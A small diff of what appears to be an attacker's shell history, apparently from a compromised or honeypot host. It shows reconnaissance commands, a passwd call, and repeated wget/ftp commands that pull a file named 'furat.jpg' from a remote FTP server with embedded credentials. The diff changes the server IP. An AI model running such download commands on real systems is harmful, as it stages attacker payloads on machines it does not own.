@@ -8,10 +8,10 @@ uname -a
 passwd
 wget
 clear
-wget ftp://myra:myra@186.95.222.230/furat.jpg
-ftp 186.95.222.230
+wget ftp://myra:myra@184.27.21.35/furat.jpg
+ftp 184.27.21.35
 scp
-wget ftp://myra:myra@186.95.222.230/furat.jpg
+wget ftp://myra:myra@184.27.21.35/furat.jpg
 clear
 w
 uname -a
